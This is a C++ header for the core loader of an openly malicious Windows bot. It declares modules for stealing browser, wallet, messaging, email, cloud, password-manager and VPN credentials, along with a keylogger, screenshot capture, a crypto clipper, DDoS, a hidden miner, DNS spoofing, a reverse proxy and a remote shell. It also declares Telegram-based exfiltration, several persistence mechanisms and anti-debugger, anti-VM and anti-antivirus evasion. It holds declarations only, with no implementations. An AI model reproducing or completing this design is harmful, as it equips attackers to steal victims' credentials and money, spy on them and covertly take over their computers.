#pragma once
#include <string>
#include <vector>
#include <map>
#include <memory>
#include <thread>
#include <atomic>
#include <chrono>
#include <functional>
#include <windows.h>
#include <wininet.h>
#include <sqlite3.h>
#include <json/json.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

// Forward declarations
class BrowserStealer;
class CryptoStealer;
class MessagingStealer;
class GamingStealer;
class DeveloperStealer;
class EmailStealer;
class CloudStealer;
class PasswordManagerStealer;
class VPNStealer;
class SystemStealer;
class Keylogger;
class ScreenshotCapture;
class CryptoClipper;
class DDoSAttack;
class SilentMiner;
class ReverseProxy;
class DNSSpoofer;
class RemoteShell;
class TaskManager;
class TelegramNotifier;
class BotManager;
class EvasionEngine;

class CoreLoader {
public:
    CoreLoader();
    ~CoreLoader();
    
    void run();
    void stop();
    
    // Core functionality
    void initialize();
    void setupPersistence();
    void loadModules();
    void scheduleTasks();
    void communicate();
    void checkForUpdates();
    
    // Getters
    std::string getBotId() const;
    std::string getSystemInfo() const;
    bool isRunning() const;
    
    // Module access
    std::shared_ptr<BrowserStealer> getBrowserStealer();
    std::shared_ptr<CryptoStealer> getCryptoStealer();
    std::shared_ptr<MessagingStealer> getMessagingStealer();
    std::shared_ptr<GamingStealer> getGamingStealer();
    std::shared_ptr<DeveloperStealer> getDeveloperStealer();
    std::shared_ptr<EmailStealer> getEmailStealer();
    std::shared_ptr<CloudStealer> getCloudStealer();
    std::shared_ptr<PasswordManagerStealer> getPasswordManagerStealer();
    std::shared_ptr<VPNStealer> getVPNStealer();
    std::shared_ptr<SystemStealer> getSystemStealer();
    
    // Monitoring modules
    std::shared_ptr<Keylogger> getKeylogger();
    std::shared_ptr<ScreenshotCapture> getScreenshotCapture();
    std::shared_ptr<CryptoClipper> getCryptoClipper();
    
    // Attack modules
    std::shared_ptr<DDoSAttack> getDDoSAttack();
    std::shared_ptr<SilentMiner> getSilentMiner();
    std::shared_ptr<ReverseProxy> getReverseProxy();
    std::shared_ptr<DNSSpoofer> getDNSSpoofer();
    std::shared_ptr<RemoteShell> getRemoteShell();
    
    // Management modules
    std::shared_ptr<TaskManager> getTaskManager();
    std::shared_ptr<TelegramNotifier> getTelegramNotifier();
    std::shared_ptr<BotManager> getBotManager();
    std::shared_ptr<EvasionEngine> getEvasionEngine();

private:
    // Core data
    std::string botId;
    std::string serverUrl;
    std::string telegramToken;
    std::string telegramChatId;
    std::atomic<bool> isRunningFlag;
    
    // Encryption
    unsigned char encryptionKey[32];
    unsigned char iv[16];
    
    // Threads
    std::thread communicationThread;
    std::thread monitoringThread;
    std::thread taskThread;
    
    // Modules
    std::shared_ptr<BrowserStealer> browserStealer;
    std::shared_ptr<CryptoStealer> cryptoStealer;
    std::shared_ptr<MessagingStealer> messagingStealer;
    std::shared_ptr<GamingStealer> gamingStealer;
    std::shared_ptr<DeveloperStealer> developerStealer;
    std::shared_ptr<EmailStealer> emailStealer;
    std::shared_ptr<CloudStealer> cloudStealer;
    std::shared_ptr<PasswordManagerStealer> passwordManagerStealer;
    std::shared_ptr<VPNStealer> vpnStealer;
    std::shared_ptr<SystemStealer> systemStealer;
    
    // Monitoring modules
    std::shared_ptr<Keylogger> keylogger;
    std::shared_ptr<ScreenshotCapture> screenshotCapture;
    std::shared_ptr<CryptoClipper> cryptoClipper;
    
    // Attack modules
    std::shared_ptr<DDoSAttack> ddosAttack;
    std::shared_ptr<SilentMiner> silentMiner;
    std::shared_ptr<ReverseProxy> reverseProxy;
    std::shared_ptr<DNSSpoofer> dnsSpoofer;
    std::shared_ptr<RemoteShell> remoteShell;
    
    // Management modules
    std::shared_ptr<TaskManager> taskManager;
    std::shared_ptr<TelegramNotifier> telegramNotifier;
    std::shared_ptr<BotManager> botManager;
    std::shared_ptr<EvasionEngine> evasionEngine;
    
    // Core methods
    void generateBotId();
    void initializeEncryption();
    void initializeModules();
    void startThreads();
    void stopThreads();
    
    // Communication methods
    void communicationLoop();
    void monitoringLoop();
    void taskLoop();
    
    // Utility methods
    std::string encryptData(const std::string& data);
    std::string decryptData(const std::string& data);
    std::string getSystemInfo();
    void logActivity(const std::string& activity);
    
    // Persistence methods
    void createRegistryPersistence();
    void createScheduledTask();
    void createStartupFolder();
    void createService();
    
    // Evasion methods
    void checkForAnalysis();
    void checkForDebugger();
    void checkForVirtualMachine();
    void checkForAntivirus();
    void performEvasion();
};